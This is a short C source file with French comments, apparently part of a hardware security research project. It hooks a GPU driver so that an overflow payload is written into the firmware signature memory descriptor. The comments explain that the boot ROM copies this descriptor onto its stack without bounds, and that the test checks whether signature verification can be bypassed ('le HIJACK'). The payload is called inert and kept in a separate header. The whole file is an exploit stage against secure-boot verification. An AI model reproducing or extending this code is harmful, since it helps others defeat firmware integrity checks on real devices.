/*
 * v445_memdesc_patch.c — 4.45 r0 : LE DÉBORDEMENT BÉNIN.
 *
 * Le drop-in driver (inclus par kernel_gsp.c) : appelé JUSTE APRÈS le
 * portMemCopy de _kgspCreateSignatureMemdesc, il écrit le payload v445
 * (le fill + l'épine inerte 0x100aec, le ctx zéro = INERT — le TT-D)
 * DANS le memdesc signature (4096 B = la taille entière).
 *
 * LE MÉCANISME (le paper Zenodo 20916112, prouvé en silicium sur cette
 * carte — le spin 0x4a7) : le BOOT ROM copie le memdesc sur SA PILE en
 * DMA NON BORNÉ (4 KB > la frame ~0x620) → le payload déborde. LA
 * QUESTION r0 = L'ORDRE copie/verify :
 *   - la panne != 0x1d  -> le verify = contourné -> LE HIJACK confirmé
 *     (la lane vivante -> r1 = la distance, r2 = la chaîne).
 *   - la panne = 0x1d   -> le verify = AVANT la copie -> LA LANE MORTE.
 *
 * L'ÉCRITURE = la copie du payload sur le memdesc mappé — RIEN d'autre ;
 * le payload = INERT (zéro écriture mémoire dans la chaîne — le TT-D).
 * Le rollback = le restore du driver stock + dkms + limine (~10 min,
 * prouvé) — le memdesc = réécrit stock par le driver au boot suivant.
 */
#include "v445_payload.h"

void
v445_patch_signature_memdesc(void *pSignatureVa)
{
    unsigned char *p = (unsigned char *)pSignatureVa;
    unsigned int i;

    for (i = 0; i < V445_PAYLOAD_SIZE; i++)
        p[i] = v445_payload[i];
    /* le RM prints = level-gated (la leçon 4.51) — le ledger = le booter
     * lui-même (le code d'échec dans dmesg = L'observable). */
}
